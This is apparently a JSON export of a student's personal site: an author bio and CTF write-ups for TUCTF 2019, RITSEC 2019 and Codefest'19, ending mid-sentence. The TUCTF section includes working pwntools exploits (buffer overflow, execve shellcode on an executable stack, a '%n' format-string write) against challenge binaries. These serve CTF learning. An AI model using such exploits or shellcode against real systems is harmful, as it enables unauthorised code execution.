[{"authors":["admin"],"categories":null,"content":"I am currently in my final year pursuing B.Tech in Computer Science and Engineering from IIT (BHU) Varanasi.\nMy B.Tech advisor is Prof. K.K. Shukla. Currently, I am working on privacy-preserving Machine Learning and its application in the medical industry. Previously I have also worked with him on Adversarial Machine Learning and Malware classification problems. In summer 2019, I was an intern at Samsung Research Institute - Bangalore, working on mobility in 5G networks. I also worked as a research intern at the C3i Institute, Indian Institute of Technology Kanpur on Malware Detection for Linux, in winter 2018. In summer 2018, I was a Data Science intern at Innoplexus, Pune (India), working with the Computer Vision team. I have also worked with Dr. Anil Kumar Singh, on sentiment analysis on product reviews and natural language generation.\nWhen not working on research, I enjoy playing CTFs (wr47h). I recently joined Abs0lut3Pwn4g3, currently the 8th ranked CTF team in India. I also enjoy writing, reading and competitive coding.\n","date":-62135596800,"expirydate":-62135596800,"kind":"taxonomy","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"/authors/admin/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/authors/admin/","section":"authors","summary":"I am currently in my final year pursuing B.Tech in Computer Science and Engineering from IIT (BHU) Varanasi.\nMy B.Tech advisor is Prof. K.K. Shukla. Currently, I am working on privacy-preserving Machine Learning and its application in the medical industry. Previously I have also worked with him on Adversarial Machine Learning and Malware classification problems. In summer 2019, I was an intern at Samsung Research Institute - Bangalore, working on mobility in 5G networks.","tags":null,"title":"Shreyansh Singh","type":"authors"},{"authors":null,"categories":["Information Security"],"content":"I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.\n Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow. First, using GDB (with GEF), we find that the offset required to overflow the buffer is 24.\n   Disassembly of main   This can be done using pattern create 50 and then using that pattern to find the crash offset.\n      Also inspecting the functions, we see that there is a printFlag function at 0x80491f6. So, our objective is to jump there.\nThe following script is the exploit.\nfrom pwn import * p = process(\u0026#34;./thefirst\u0026#34;) # p = remote(\u0026#34;chal.tuctf.com\u0026#34;, 30508) print_flag_addr = 0x80491f6 offset = 20 payload = \u0026#34;A\u0026#34;*offset payload += \u0026#34;BBBB\u0026#34; payload += p32(print_flag_addr) f = open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) f.write(payload) f.close() p.recvuntil(\u0026#39;\u0026gt; \u0026#39;) p.sendline(payload) p.interactive()  shellme32 - 462 pts On running the program, we are given an address and we have to provide some input. On analysing it using GDB, and using vmmap, we find that the adress given to us is that of the stack and the stack is read, write and executable.\n   We use shell-storm to get the shellcode. First we get the offset of the crash like before. In the script below, we use the shellcode, pad it with \u0026lsquo;A's and then provide the address to write to, i.e. the adress provided to us.\nshellcode = \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\u0026#34; len_shell_code = 28 from pwn import * # context.log_level = \u0026#39;debug\u0026#39; p = process(\u0026#34;./shellme32\u0026#34;) offset = 40 p.recvuntil(\u0026#39;?\\n\u0026#39;) addr = int(p.recvline().strip(), 16) p.recvuntil(\u0026#39;\u0026gt; \u0026#39;) log.info(\u0026#39;Stack Address: \u0026#39; + str(hex(addr))) payload = shellcode payload += \u0026#34;A\u0026#34;*(offset - len_shell_code) payload += p32(addr) print(len(shellcode)) p.sendline(payload) with open(\u0026#39;payload\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(payload) p.interactive()  printfun - 500 pts Here, on analysing with Ghidra, we find that there is a format string vulnerability.\n   So, here first we use GDB to get the addresses of the two buffers being compared. Also, as input if we provide \u0026quot;%x %x %x %x %x %x %x %x %x %x %x %x %x %x\u0026quot;, for the instance running on GDB we get this output -\n5655a050 3c 14 1 ffffc994 5655a050 5655a008 ffffc900 0 0 f7e06637 f7fa0000 f7fa0000 0\nOn seeing the values displayed by GDB, we see two addresses - 0x5655a008 and 0x5655a050\n   This is intereting as both these addresses are also present in the program's output with our input.\nSo, all we have to do is overwrite the 6th and 7th \u0026ldquo;addresses\u0026rdquo; of the output to the same value so that the string comparison passes.\nWe write the following exploit code, which works locally. I hope it would work remotely as well (but no way to test it now â˜¹) -\nfrom pwn import * p = process(\u0026#34;printfun\u0026#34;) payload = \u0026#34;AAAA%6$n%7$n\u0026#34; p.sendlineafter(\u0026#39;? \u0026#39;, payload) p.interactive()  Rev Challenges faker - 400 pts If we open the binary in Ghidra, we see that there are calls to different functions, namely A, B and C, which depend on the user input. But on trying them, we get fake flags.\n   But all of them have a common structure, they have a call to printFlag with a string.\n   Also in the functions list, we see that there is a function named thisone. First we take a look at printFlag function.\n   There can be two ways to solve this challenge.\nMethod 1 - Static Write a script to emulate the functionality of the printFlag function.\ndef printFlag(s): s2 = \u0026#34;\u0026#34; for i in range(len(s)): x = ((((ord(s[i]) ^ 0xf) - 0x1d) * 8) % 0x5f) + 0x20 s2 += chr(x) print(s2) printFlag(\u0026#34;\\\\PJ\\\\fC|)L0LTw@Yt@;Twmq0Lw|qw@w2$a@0;w|)@awmLL|Tw|)LwZL2lhhL0k\u0026#34;) This gives us the flag - TUCTF{7h3r35_4lw4y5_m0r3_70_4_b1n4ry_7h4n_m3375_7h3_d3bu663r}\nMethod 2 - Dynamic Here set a breakpoint in main and then run the following commads in GDB.\n(gdb) info functions # get address of printFlag function (gdb) set $rip=0x000055555555534b # i.e. to the address of the function (gdb) c This will print the flag.\n core - 400 pts We a re provided a core dump and a C file. The C file looks like this\n#include \u0026lt;stdio.h\u0026gt; // prints#include \u0026lt;stdlib.h\u0026gt; // malloc#include \u0026lt;string.h\u0026gt; // strcmp#include \u0026lt;unistd.h\u0026gt; // read#include \u0026lt;fcntl.h\u0026gt; // open#include \u0026lt;unistd.h\u0026gt; // close#include \u0026lt;time.h\u0026gt; // time #define FLAG_LEN 64char flag[FLAG_LEN]; void xor(char *str, int len) { for (int i = 0; i \u0026lt; len; i++) { str[i] = str[i] ^ 1; } } int main() { setvbuf(stdout, NULL, _IONBF, 20); setvbuf(stdin, NULL, _IONBF, 20); // Read the flag \tmemset(flag, 0, FLAG_LEN); printf(\u0026#34;\u0026gt; \u0026#34;); int len = read(0, flag, FLAG_LEN); xor(flag, len); char buf[32]; read(0, buf, 128); return 0; } Basically we are XORing the input string with 1. We assume that flag is in the standard format, i.e. begins with TUCTF. So we pre-calculate, the starting of the string that should be in memory.\nTUCTF =\u0026gt; UTBUG\nWe use xxd to view the core.\n   We find something interesting in the memory. On decoding\ncore_string = \u0026#34;55544255477a623173325e65746c713e5e4f327732735e69323573655e31675e7831747c\u0026#34;.decode(\u0026#39;hex\u0026#39;) flag = \u0026#34;\u0026#34; for i in core_string: flag += chr(ord(i) ^ 1) print(flag) The flag - TUCTF{c0r3_dump?_N3v3r_h34rd_0f_y0u}\n That's all for now ğŸ‘‹.\n","date":1575295797,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575554997,"objectID":"e9f0a95959ab730e76b5bef200fe2fc9","permalink":"/post/2019-12-02_tuctf-pwn-2019/","publishdate":"2019-12-02T19:39:57+05:30","relpermalink":"/post/2019-12-02_tuctf-pwn-2019/","section":"post","summary":"I couldn't give much time to the CTF because of some college work, but I gave a shot at the PWN challenges. The challenges became offline later but I still decided to work on the exploit scripts to make them work locally.\n Pwn Challenges thefirst - 379 pts We can see in the image below that gets is being used to take the input. Hence it can be exploited for buffer overflow.","tags":["ctf","information security","infosec","writeups"],"title":"TUCTF 2019 - Pwn \u0026 Rev Challenges","type":"post"},{"authors":["Shreyansh Singh"],"categories":["Information Security"],"content":"Details coming soon!\n","date":1574684613,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1574684613,"objectID":"a046b443526d57a08981cc321ade8d76","permalink":"/project/privacy-ml/","publishdate":"2019-11-25T17:53:33+05:30","relpermalink":"/project/privacy-ml/","section":"project","summary":"Perform medical image classification in a secure and privacy-preserving manner using Secure Multiparty Computation and Differntial Privacy","tags":["information security","deep learning","secure multi-party computation","differential privacy","image classification"],"title":"Privacy-preserving Machine Learning using Secure Multiparty Computation","type":"project"},{"authors":null,"categories":["Information Security"],"content":"A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 ISTâ€Šâ€”â€ŠMon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.\nUpdate: The scripts to solve and the flags are present in this repo.\nI'll do the writeups category-wise -\n Crypto Â pre-legendâ€Šâ€”â€Š100 pts\n9EEADi^â¸:E9F3]4@\u0026amp;gt;â´=2J32==^D@\u0026amp;gt;6E9:?8\\FD67F=\\C:ED64\nThis is the provided cipher text. Since all of these are ASCII characters, we try a ROT of till say, 50.\n On i=47, we getâ€Šâ€”â€Šhttps\\x98\\x8d\\x8dgithub\\x8ccom\\x8dclayball\\x8dsomething\\x8buseful\\x8britsec\nThere is a problem with the special characters, but we understand that is a GitHub repo, with the URL (after some testing)â€Šâ€”â€Šhttps://github.com/clayball/something-useful-ritsec.\nAlthough there is nothing flag related in the repo, but the discord group of the CTF said that the link itself is the flag.\nFlagâ€Šâ€”RITSEC{https://github.com/clayball/something-useful-ritsec}\nÂ Shinyâ€Šâ€”â€Š100 pts\nWe are given the following text, and an image .â€¡8]5);483â€¡5;\n   gold-bug.jfif   This did not hit me directly, so I had to do a bit of Googling. I found that this is a reference to a short story by Edgar Allan Poe, called The Gold Bug which involves a substitution cipher. I found an online tool for the same.\nThis gives us the flagâ€Šâ€”RITSEC{POEWASTHEGOAT}\nÂ randomâ€Šâ€”â€Š290 pts\nAfter connecting to nc ctfchallenges.ritsec.club 8001 we find that we are presented with a series of numbers and we have to guess the next. The challenge title tells us that we have something to do with the random function in the C language, because of the hint,\n Are you starting to \u0026lsquo;C\u0026rsquo; a pattern?\n We make a guess that whenever we request that host and port, the random function is initialized with a certain seed and we are given the first five random numbers generated from that seed. So, I wrote a simple C code to bruteforce all unix timestamps from 15th Nov 2019, 00:00 UTC to 17th Nov. 2019 00:00 UTC, and check for the seed. The code is shown below â€”\n#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;stdlib.h\u0026gt; int main() { int start = 1573776000; // 15th Nov 2019, 00:00 UTC  int end = 1573948800; // // 17th Nov 2019, 00:00 UTC  for(int i=start; i\u0026lt;end; i++) { srand(i); int a = rand(); int b = rand(); int c = rand(); int d = rand(); int e = rand(); int f = rand(); if(a==1068399227 \u0026amp;\u0026amp; b==161933545 \u0026amp;\u0026amp; c==741438783 \u0026amp;\u0026amp; d==1951874661 \u0026amp;\u0026amp; e==1076387813) { printf(\u0026#34;Seed: %d\\n\u0026#34;, i); printf(\u0026#34;Next: %d\\n\u0026#34;, f); break; } } return 0; } We provide the next number, and get the flagâ€Šâ€”â€ŠRITSEC{404_RANDOMNESS_NOT_FOUND}\n Misc Â Crack me If You Canâ€Šâ€”â€Š391 pts\nIn this challenge, after connecting to nc ctfchallenges.ritsec.club 8080, we find that we are presented with queries of hashes, and we have to break them in order to get the flag. They were NTLM and sha256 hashes. So, we used a combination of crackstation.net and John the Ripper to crack both of them.\nWe found the flagâ€Šâ€”â€ŠRS{H@$HM31FY0UCAN}\nÂ Onion Layer Encodingâ€Šâ€”â€Š100 pts\nThe challenge says that the text is encoded using either Base16 or Baser32 or Base64 in a sequence. So we write a simple python script to solve it.\nimport base64 flag = open(\u0026#34;onionlayerencoding.txt\u0026#34;,\u0026#34;r\u0026#34;).read() while \u0026#34;RITSEC\u0026#34; not in str(flag): try: flag = base64.b16decode(flag) except: try: flag = base64.b32decode(flag) except: flag = base64.b64decode(flag) print(flag) The flag isâ€Šâ€”â€ŠRITSEC{0n1On_L4y3R}\nÂ AlPhAbEtIcAl Challenge - 100pts\nI couldn't solve this during the CTF, but saw other writeups and found that it was actually pretty interesting. The cipher text that is provided is â€”\n 59:87:57:51:85:80{:40:50:56:08:82:58:81:08:18:85:57:87:48:85:88:40:50:56:59:15:56:11:18:85:59:51:}\n We see that the \u0026lsquo;{\u0026rsquo; and \u0026lsquo;}\u0026rsquo; are in place. So, this must represent the flag. The other numbers are assigned some alphabet starting from \u0026lsquo;A\u0026rsquo;. After this we see that we have the followingâ€Šâ€”â€ŠABCDEF{GHIJKLMJNECBOEPGHIAQIRNEAD}.\nOn this we use an online substitution solver like quipquip.com and also the fact that ABCDEF corresponds to RITSEC, we get the flag asâ€Šâ€”â€ŠRITSEC{YOUALPHABETIZEDYOURNUMBERS}\n Web Â misdirectionâ€Šâ€”â€Š100 pts\nWe are given a URLâ€Šâ€”â€Šhttp://ctfchallenges.ritsec.club:5000/ However, on clicking it we see that we are directed to another webpage http://ctfchallenges.ritsec.club:5000/n and the information that the webpage isn't redirecting properly. So, I decided to see what is happening, for that I did a simple wget to the url.\n   Running wget   We see that the page redirects to different pages and keeps doing that. We note that the last character is basically in the flag format when put together. We do that and get the flagâ€Šâ€”â€ŠRS{4!way5_Ke3p-m0v1ng}\nÂ Buckets of funâ€Šâ€”â€Š100 pts\nWe are given the following URLâ€Šâ€”â€Šhttp://bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com/\nTaking a hint from the name of the challenge, we try the following URL in the browserâ€Šâ€”http://bucketsoffun-ctf.s3.amazonaws.com\n   The webpage   We see a file youfoundme-asd897kjm.txt\nHeading to http://bucketsoffun-ctf.s3.amazonaws.com/youfoundme-asd897kjm.txt we find the flagâ€Šâ€”â€ŠRITSEC{LIST_HIDDEN_FILES}\n Forensics Â Take it to the Cleanersâ€Šâ€”â€Š100 pts\nWe are given an image\n   The challenge   Performing basic recon, we check the metadata for the image using exiftool.\n   exiftool output   In the user comment, we see a string which is probably base64 encoded.\nDecoding it gives, EVGFRP{SBERAFVPF_SNVYF_JBAG_URYC_LBH_URER}\nLooks rotated by an offset. We use http://theblob.org/rot.cgi to get rotations by different offsets. This is ROT13 and the flag isâ€Šâ€”â€ŠRITSEC{FORENSICS_FAILS_WONT_HELP_YOU_HERE}\nÂ Long Goneâ€Šâ€”â€Š100 pts\nWe are provided a chromebin. Extract it as it is a tar archive.\n tar xzvf ./chromebin\n We see there are a lot of folders, on inspecting the history we find it is an SQLite 3.X database. Loading it into DBBrowser, and inspecting the tables, shows an odd URLâ€Šâ€”â€Šus-central-1.ritsec.club/l/relaxfizzblur\nOpening the url gives the flagâ€Šâ€”â€ŠRITSEC{SP00KY_BR0WS3R_H1ST0RY}\n Pwn Â 999 Bottlesâ€Šâ€”â€Š110 pts\nWe are given 999 ELF files, each having a password as a single character. Basically, 999 crackmes with a one character password. If we check the disassembly of main function of any one â€”\n   The disassembly for main   At 0x8048728 we see a comparison, where register edx (dl) stores our input character and eax (al) stores the value at address 0x804a039.\nAlso, in the disassembly, we have some character mappings to addresses â€”\n   Character mappings   So, one way to solve this challenge is to get the address to be compared and check the character at this address and automate it somehow.\nDuring the CTF, however, I wrote a bruteforce script to try all characters for every ELF file.\nfrom pwn import * import string FOLDER = \u0026#39;./elfs/\u0026#39; filenames = [] s = string.digits + string.letters + string.punctuation for i in range(1,1000): filenames.append(str(i).zfill(3) + \u0026#39;.c.out\u0026#39;)flag = \u0026#39;\u0026#39; f = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;w\u0026#39;) for file in filenames: for inp in s: p = process(FOLDER+file) p.recv() p.sendline(inp) a = p.recvline() if \u0026#39;OK!\u0026#39; in a: flag += inp p.close() print(\u0026#34;FLAG: \u0026#34; + flag) f.write(\u0026#34;FLAG: \u0026#34; + flag) f.write(\u0026#39;\\n\u0026#39;) break else: p.close() f.write(\u0026#34;FLAG: \u0026#34; + flag) print(flag) f.close() Finally, we have the following string in the output generated -\n lr^wN${HnW\u0026lt;DtVjk.RITSEC{AuT057v}^W!xT\n Note the string in the flag format, that is the flagâ€Šâ€”â€ŠRITSEC{AuT057v}\nA better way to solve it actually using the method described above. The following script can help do that -\nimport r2pipe import binascii import sys for i in range(1, 1000): print(\u0026#39;elfs/{0:03}\u0026#39;.format(i)) b = r2pipe.open(\u0026#39;elfs/{0:03}\u0026#39;.format(i) + \u0026#39;.c.out\u0026#39;) disass = b.cmd(\u0026#39;aaa; s main; pdd\u0026#39;) field = disass.split(\u0026#34;eax = *(obj.\u0026#34;)[1][0] byte = disass.split(f\u0026#39;*(obj.{field}) = \u0026#39;)[-1][2:4] print(binascii.unhexlify(byte).decode(\u0026#39;ascii\u0026#39;), sep=\u0026#39;\u0026#39;) This is all. Thanks for reading!\nFollow me on Twitter, Github or connect on LinkedIn.\n","date":1574184719,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1575041698,"objectID":"c98121fa35ee86bc6b229e067718175a","permalink":"/post/2019-11-19_ritsec-ctf-2019/","publishdate":"2019-11-19T17:31:59.681Z","relpermalink":"/post/2019-11-19_ritsec-ctf-2019/","section":"post","summary":"A bit late for writeups, but still here are the solutions to the challenges I solved during the CTF. The CTF was from 15 Nov. 2019, 22:30 ISTâ€Šâ€”â€ŠMon, 18 Nov. 2019, 10:30 IST. It was a decent CTF with quality challenges, from both beginner to advanced level.\nUpdate: The scripts to solve and the flags are present in this repo.\nI'll do the writeups category-wise -\n Crypto Â pre-legendâ€Šâ€”â€Š100 pts","tags":["ctf","information security","infosec","writeups"],"title":"RITSEC CTF 2019","type":"post"},{"authors":null,"categories":["Information Security"],"content":"The Capture the Flag event for Codefestâ€™19 was hosted from 8 pm, 23rd August 2019 to 12 noon, 24th August 2019 on Hackerrank.\nThe contest link can be found here. There were a total of 1532 registrations and 518 people who were successful in solving atleast one challenge.\nSo, onto the writeups.\nWelcome to Codefest 19! (Intro Challengeâ€Šâ€”â€Š100pts) This was the introductory challenge. I had tried to make it a bit difficult than the normal introductory challenges, but I felt that it proved to be a bit difficult for the beginners.\n   The challenge   Here, first you had to join the telegram group linked in the proble. There you got the first half of the flagâ€Šâ€”â€Š**CodefestCTF{G3t_r3ady_**. For the other half there was a pinned message on the group.\n The other half of the flag was uploaded on the contest page yesterday by accident. It has now been removed. Can you find it?\n For this you had to use archive.org, there was a snapshot of the contest page created on 23rd Aug 2019. Viewing the snapshot got you the second half of the flagâ€Šâ€”f0r_C0def3stCTF-8fb34fjr4bs43ur8}.\nSo, the final flag isâ€Šâ€”â€ŠCodefestCTF{G3t_r3ady_f0r_C0def3stCTF-8fb34fjr4bs43ur8}\nÂ What language is this? (Miscâ€Šâ€”â€Š100pts) This was basically a esoteric language question. The given text was â€”\niiisdsiiioiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiodddddddddddoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiiiiioddddddddddddddoiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddoiiiiiiiiiiiiiioiiiiiiiodddddddddodddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddddddddsiiiiiiiiioddddddddoddddddoiiiiiiiiiiiiiiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisdddddoddddddddddddddddddddddddddddodddddddddddddddddddoddddddddddddddddddddddddddddddddsiiisisoioiodoiiiiiiiiiiiiiioiodddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddoiiiiiiiioddddddddddddddddddddddddddddddddddddddddddddddsiiiio The language was Deadfish. You could use an online decoder for that language, something like this.\nThe final flag wasâ€Šâ€”â€ŠCodefestCTF{Welc0me_t0_C0defest19}\nÂ Gibberish file (Miscâ€Šâ€”â€Š100pts)    The challenge   The hint was in the problem statement. You had to reverse the file to find the flag. A simple one-line script could do it\nopen(\u0026#34;output2.txt\u0026#34;, \u0026#34;wb\u0026#34;).write(open(\u0026#34;output.txt\u0026#34;, \u0026#34;rb\u0026#34;).read()[::-1]) The resulting had some text like\n ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸ ğ©ğ—µğ™š ğ—³ğ’ğ™–ğ—´ ğ’Šğ™¨ ğ‹ğ’Šğ“ğš¬ğ«ğš¨ğ‹ï¹ğ•½ğœ ğ“¥ï¼¥â„œğ•Šğ¢ğ™£ğ“–ê“¸\n The flag was the ASCII analog of each unicode character.\nThe flag wasâ€Šâ€”â€ŠCodefestCTF{LiTErAL_REVERSinG}\nÂ Image Corruption (Forensicsâ€Šâ€”â€Š100pts) In the challenge, you were given a link to a corrupted .bmp file. On viewing the file in a hex editor, and also checking the magic bytes â€”\n   Hex view of the image   We know there is something to do with â€œmatrixâ€. Also for a normal .bmp file the initial magic bytes are 424d 8a44 1300. XORing this with the first six bytes of the given file also gives you â€œmatrixâ€. So to solve the challenge, we XOR the whole image with â€œmatrixâ€.\n Run the script, and you obtain the correct file.\n   The correct file   The flag isâ€Šâ€”â€ŠCodefestCTF{f1l35_h4v3_m461c_by735}\nÂ Mail capture (Steganographyâ€” 100pts) You are presented with a â€œemail friendly textâ€. This was encoded to unicode by a tool called uuencode. It can be decoded by using uudecode, a decoder for such formats. Running uudecode with the file gives an output file called â€œflag_encodedâ€. The contents are the flagâ€Šâ€”â€ŠCodefestCTF{7h15_15_4_c001_3nc0d1n9}\nÂ Cats are innocent, right? (Steganographyâ€” 500pts) This challenge was based on LSB steganography. I had used a tool called stegify.\nThe challenge image -\n   Challenge image   On running the command -\n stegify -op decode -carrier cute_kittens.jpg -result hello\n We get a hello.zip file which was embedded in the LSBs of the image. The zip file had a file inside it but that was of no use. The flag was appended at the end of the zip file.\n   The flag is appended at the end of the zip file\nThe flag isâ€Šâ€”â€ŠCodefestCTF{h1d1ng_b3h1nd_1nn0c3nt_k1tt3n5}\nÂ Weird encoding (Miscâ€” 200pts)    The challenge   We are given the following â€œencodingâ€\n0x85+1x1+0x14 0x7+1x1+0x7+1x1+0x9+1x2+0x3+1x4+0x3+1x1+0x6+1x5+0x1+1x1+0x2+1x1+0x1+1x2+0x13+1x2+0x3+1x1+0x8+1x1+0x5+1x2+0x8 0x1+1x5+0x18+1x3+0x3+1x1+0x16+1x2+0x1+1x1+0x5+1x2+0x2+1x1+0x3+1x1+0x4+1x2+0x3+1x3+0x3+1x1+0x2+1x2+0x4+1x3+0x8 0x3+1x1+0x7+1x1+0x11+1x2+0x1+1x1+0x3+1x5+0x12+1x1+0x2+1x1+0x7+1x1+0x10+1x1+0x3+1x2+0x1+1x1+0x5+1x3+0x4+1x1+0x1+1x2+0x2+1x1+0x4 0x3+1x1+0x3+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x2+1x1+0x7+1x1+0x11+1x2+0x2+1x2+0x5+1x2+0x10+1x1+0x3+1x1+0x2+1x1+0x3+1x2+0x2+1x1+0x4+1x4+0x7 0x3+1x1+0x3+1x1+0x3+1x1+0x1+1x3+0x10+1x1+0x7+1x1+0x7+1x1+0x3+1x1+0x3+1x1+0x1+1x2+0x2+1x3+0x8+1x5+0x4+1x1+0x3+1x9+0x1+1x3+0x7 0x3+1x1+0x3+1x3+0x1+1x1+0x1+1x4+0x9+1x1+0x6+1x2+0x2+1x1+0x7+1x2+0x3+1x1+0x2+1x1+0x4+1x1+0x10+1x1+0x6+1x1+0x7+1x1+0x7+1x4+0x4 0x5+1x1+0x1+1x1+0x1+1x1+0x1+1x1+0x4+1x2+0x7+1x2+0x3+1x4+0x11+1x1+0x4+1x1+0x2+1x1+0x3+1x2+0x6+1x1+0x3+1x1+0x6+1x1+0x7+1x1+0x1+1x1+0x1+1x5+0x7 0x7+1x1+0x1+1x1+0x1+1x1+0x2+1x3+0x7+1x5+0x16+1x1+0x4+1x1+0x2+1x1+0x1+1x3+0x3+1x6+0x2+1x1+0x2+1x1+0x1+1x5+0x5+1x1+0x2+1x1+0x4+1x1+0x7 0x18+1x5+0x13+1x6+0x27+1x1+0x14+1x1+0x2+1x2+0x2+1x1+0x5+1x1+0x2 0x1+1x1+0x5+1x1+0x4+1x1+0x3+1x1+0x8+1x1+0x8+1x1+0x9+1x1+0x8+1x1+0x5+1x1+0x17+1x1+0x10+1x3+0x9 0x68+1x1+0x11+1x1+0x19 Here a bit of observation was required to figure out that the â€œxâ€ symbol mean concatenation n number of a character, like 0x5 will mean 00000. And â€œ+â€ would mean concatenation of two strings of different type. Also, one will also have to decide on 0 representing 255 255 255 i.e. the color white and 1 representing 0 0 0 , i.e. the color black. You could have experimented with both combinations but eventually you would get the correct mapping.\nThe following script can help generate the image.\n The obtained image is this -\n   You may want to zoom in a bit   The flag isâ€Šâ€”â€ŠCodefestCTF{This_15_7h3_f14g}.\nÂ Linux RE 1 (Reversingâ€Šâ€”â€Š300pts) This challenge was a bit difficult to solve using a debugger due to some anti-debugging techniques that were implemented. Also, initially the ELF was packed using UPX, which was visible as a string when you would have run the strings command. So, first use\n upx -d\n with the ELF to decompress it.\nFor the next part, You could use a disassembler or a decompiler to get the source code and eventually reverse the binary. The executable was generated from a C++ file hence it was a bit messy to view in a decompiler.\nThe decompiled view (using Ghidra) of the main function (the interesting part) is the following -\n   Decompiled main function   The key_int and enc_int are global variables. The main logic of the ELF is in the rahasya function.\n   Decompiled rahasya function   This basically takes two strings and XORs them and returns the XORd string. The two strings it takes as input are the user input and the key_int string. The XORd data is matched with the enc_int data.\nSo, basically to reverse the binary you have to XOR both the key_int and enc_int data.\n   enc_int data      key_int data   Basically,\n int enc_int[] = {80, 93, 3, 67, 3, 86, 11, 110, 64, 2, 90, 27, 84, 28, 110, 75, 3, 69, 52, 6, 11, 5, 80, 88, 90, 88};\n  int key_int[] = {49, 51, 51, 55, 107, 101, 121};\n XOR both of them, and you get an0th3r_s1mp1e_x0r_cr4ckm3\nSo, the flag is CodefestCTF{an0th3r_s1mp1e_x0r_cr4ckm3}\nÂ Linux RE 2 (Reversingâ€Šâ€”â€Š500pts) Again we open the file in IDA or any disassembler and/or decompiler we see that the input should satisfy a set of conditions on the letters of the input.\nThe conditions can be translated as\n We can use some kind of SMT solver like z3 to find the password.\n The 